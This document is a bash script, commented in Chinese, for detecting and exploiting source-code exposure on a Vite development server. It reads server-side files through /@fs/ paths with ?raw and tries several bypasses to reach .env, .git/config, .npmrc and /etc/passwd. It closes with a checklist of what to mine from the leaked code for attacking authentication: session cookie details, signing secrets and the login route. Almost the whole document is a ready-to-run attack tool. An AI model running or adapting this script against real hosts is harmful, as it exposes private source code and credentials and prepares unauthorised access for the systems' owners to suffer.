#!/bin/bash
# Vite dev server 源码泄露检测与利用（通用）
# 用法: T=http://host:port bash vite_dev_leak.sh
T="${T:-http://127.0.0.1:5173}"
C=(curl -s -m 15 -k --noproxy "*")

echo "== 1. 判定是否为 Vite dev server =="
# 特征：/@vite/client 返回大体积 application/javascript；页面 HTML 里含 /@vite/client 或 /src/styles/*.css
${C[@]} -o /dev/null -w "/@vite/client -> %{http_code} %{size_download} %{content_type}\n" "$T/@vite/client"
${C[@]} "$T/" | grep -oE '(/@vite/client|/@fs/[^"]*|<script type="module" src="[^"]*")' | sort -u | head

echo "== 2. 定位项目根（页面里的 data-vite-dev-id / 报错信息会暴露绝对路径）=="
${C[@]} "$T/" | grep -oE 'data-vite-dev-id="[^"]*"' | head -3

echo "== 3. 读源码：/@fs/<绝对路径> =="
# 绝对路径来自步骤 2，例如 /root/aiprice
${C[@]} -o /dev/null -w "package.json -> %{http_code} %{size_download}\n" "$T/@fs/root/aiprice/package.json"

echo "== 4. 关键：?raw 直接返回原始源码（.astro/.ts 的浏览器版会 throw，?raw 不会）=="
# 这一步是本方法的要点：不加 ?raw 时 .astro 只回 Vite 的客户端壳（Astro components cannot be used in the browser）
for f in \
  "apps/aiprice/src/internal/auth.ts" \
  "apps/aiprice/src/internal/server-context.ts?raw" \
  "apps/aiprice/src/pages/internal/login.astro?raw" \
  "apps/aiprice/src/middleware.ts" \
  "apps/aiprice/package.json" \
  "pnpm-workspace.yaml" ; do
  ${C[@]} -o /dev/null -w "$f -> %{http_code} %{size_download}\n" "$T/@fs/root/aiprice/$f"
done

echo "== 5. 边界（实测结论，勿浪费时间）=="
# Vite server.fs.allow 默认 = workspace root ⇒ 项目外文件 403（/@fs/etc/passwd → 403）
# Vite server.fs.deny 默认 = ['.env','.env.*','*.{crt,pem}','**/.git/**'] ⇒ .env/.npmrc/.git 全 403
# 实测无效的绕过：%2eenv / .%65nv / 尾随点空格 / //.env / ../ 穿越 / ?raw / ?import / ?inline / %00
for b in "/@fs/root/aiprice/%2eenv" "/@fs/root/aiprice/.env?raw" "/@fs/root/aiprice/.env?import" \
         "/@fs/root/aiprice/.env.local" "/@fs/root/aiprice/.git/config" "/@fs/root/aiprice/.npmrc" \
         "/@fs/etc/passwd" ; do
  ${C[@]} -o /dev/null -w "BYPASS $b -> %{http_code}\n" "$T$b"
done
# 注意：?raw 在 URL 末尾对 .ts/.astro 有效，但对 deny 名单内的文件无绕过效果

echo "== 6. 拿到源码后优先读 =="
cat <<'EOF'
  src/internal/auth.ts            → 会话 Cookie 名、签名算法（HMAC-SHA256?）、TTL、比较是否常量时间
  src/internal/server-context.ts  → 密钥来源 env 名与强度校验（本例要求 ADMIN_SECRET 长度 ≥32，故无默认/空密钥绕过）
  src/pages/internal/login.astro  → 登录处理逻辑（本例为单字段 secret，POST /internal/login/）
  src/middleware.ts               → 私有路由前缀（/api/ /health/ /internal/ /ui/）
  package.json / pnpm-workspace.yaml → monorepo 结构与 apps/packages 目录名
  dist/runtime/entry.js           → SSR 打包产物（可达数 MB，含全部服务端路由）
EOF
echo "== 7. 常配合的旁路发现 =="
echo "  GET /robots.txt  → Disallow 项常直接给出内部路径（本例泄露 /api/internal/ /internal/ /ui/ /health/）"
echo "  GET /internal/   → 302 到登录页即证明后台存在"